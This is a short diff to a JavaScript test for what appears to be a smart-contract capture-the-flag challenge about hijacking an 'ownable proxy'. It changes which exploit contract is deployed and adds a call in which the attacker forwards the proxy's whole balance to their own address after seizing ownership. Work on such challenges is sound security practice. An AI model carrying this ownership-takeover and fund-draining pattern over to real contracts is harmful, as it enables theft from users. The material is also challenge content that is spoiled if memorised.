@@ -24,13 +24,14 @@ describe('[OWNABLE PROXY EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
-        let exploit = await (await ethers.getContractFactory('OwnableProxyExploit', deployer)).deploy(this.ownableProxy.address)
-
+        let exploit = await (await ethers.getContractFactory('OwnableProxyExploit_2', deployer)).deploy(this.ownableProxy.address)
+        
         console.log(`Owner    : ${await this.ownableProxy.owner()}`)
         let balanceBefore = await ethers.provider.getBalance(attacker.address)
 
         await exploit.connect(attacker).run();
-        
+        await this.ownableProxy.connect(attacker).forward_call_with_value(attacker.address, [], INITIAL_BALANCE)
+
         let balanceAfter = await ethers.provider.getBalance(attacker.address)
         console.log(`New Owner: ${await this.ownableProxy.owner()}`)
 
